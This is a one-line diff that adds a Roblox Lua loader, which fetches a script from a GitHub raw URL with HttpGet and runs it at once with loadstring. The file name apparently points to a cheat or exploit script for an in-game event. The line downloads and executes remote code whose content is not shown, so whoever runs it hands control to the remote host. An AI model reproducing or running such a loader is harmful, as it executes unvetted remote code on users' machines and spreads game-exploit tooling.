@@ -1,0 +1,1 @@
+loadstring(game:HttpGet("https://raw.githubusercontent.com/Swarmzorouter/loaders/main/loaders/event-solve-the-cube-spam6-nrtlsuq9o7jc7i.lua"))()
